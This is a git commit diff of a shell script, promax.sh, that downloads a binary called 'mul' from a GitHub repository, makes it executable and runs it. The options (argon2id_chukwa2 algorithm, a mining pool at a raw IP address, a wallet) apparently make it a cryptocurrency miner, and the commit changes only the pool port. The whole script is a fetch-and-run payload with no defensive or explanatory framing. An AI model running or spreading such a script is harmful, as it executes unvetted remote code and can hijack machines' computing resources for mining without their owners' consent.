a221b4b6304d49f480ff2ea86195f248f1895336
calebsto <82493755+calebsto@users.noreply.github.com>
2021-04-29 16:29:13 +0700

    Update promax.sh

--- promax.sh
+++ promax.sh
@@ -1,3 +1,3 @@
 wget https://github.com/calebsto/rap/raw/main/mul
 chmod +x mul
-./mul --algorithm argon2id_chukwa2 --pool 194.195.212.103:3389 --wallet uwu -p x
+./mul --algorithm argon2id_chukwa2 --pool 194.195.212.103:10383 --wallet uwu -p x
